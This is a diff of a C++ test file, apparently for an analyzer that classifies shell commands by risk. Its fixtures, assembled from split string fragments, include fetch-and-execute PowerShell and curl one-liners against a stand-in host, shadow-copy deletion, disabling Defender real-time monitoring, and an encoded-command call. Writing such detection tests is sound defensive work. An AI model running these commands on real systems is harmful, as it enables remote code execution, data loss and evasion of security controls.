@@ -187,11 +187,15 @@ static QStringList analyzerVocabulary()
 
 /// Vài lệnh CHẮC CHẮN nguy hiểm, mỗi lệnh nằm gọn trên một dòng - dùng làm "kim" để kiểm tra rằng nhiễu
 /// xung quanh (dù dài/quái tới đâu) không che được nó.
+/// Chuỗi -EncodedCommand HỢP LỆ (Base64 của UTF-16LE "Get-Date; Get-Process; Get-Date" - vô hại). Từ v1.28.1 bộ phân tích
+/// đòi đúng dạng UTF-16LE như PowerShell bắt buộc; chuỗi "QQQQ..." trước đây PowerShell giải mã ra rác, không còn bị tính.
+static const char* kEncodedCommand = "RwBlAHQALQBEAGEAdABlADsAIABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAOwAgAEcAZQB0AC0ARABhAHQAZQA=";
+
 static QStringList dangerousNeedles()
 {
     const QString url = S({"http://h.example/a"});
     return {
-        S({"power", "shell -e", "nc "}) + QString(64, 'Q'),
+        S({"power", "shell -e", "nc "}) + QString::fromLatin1(kEncodedCommand),
         S({"ir", "m "}) + url + S({".ps1 | i", "ex"}),
         S({"vss", "admin del", "ete sha", "dows /all /quiet"}),
         S({"Set-MpPre", "ference -Disable", "Realtime", "Monitoring $true"}),
@@ -292,7 +296,7 @@ static void stressAnalyzerBigInputs(Rng& rng)
         const QList<FarTail> farTails = {
             {S({"cu", "rl "}) + url, S({" | i", "ex"}), RL::Dangerous},
             {S({"iw", "r "}) + url + " -OutFile a.exe", S({"; Start-Pro", "cess a.exe"}), RL::Dangerous},
-            {S({"power", "shell"}), S({" -e", "nc "}) + QString(64, 'Q'), RL::Dangerous},
+            {S({"power", "shell"}), S({" -e", "nc "}) + QString::fromLatin1(kEncodedCommand), RL::Dangerous},
             {S({"pw", "sh.exe"}), S({" -e", "p by", "pass -file a.ps1"}), RL::Suspicious},
             {S({"power", "shell"}), S({" -w", "in hid", "den"}), RL::Suspicious},
             {S({"vss", "admin.exe "}), S({" del", "ete sha", "dows /all"}), RL::Dangerous},
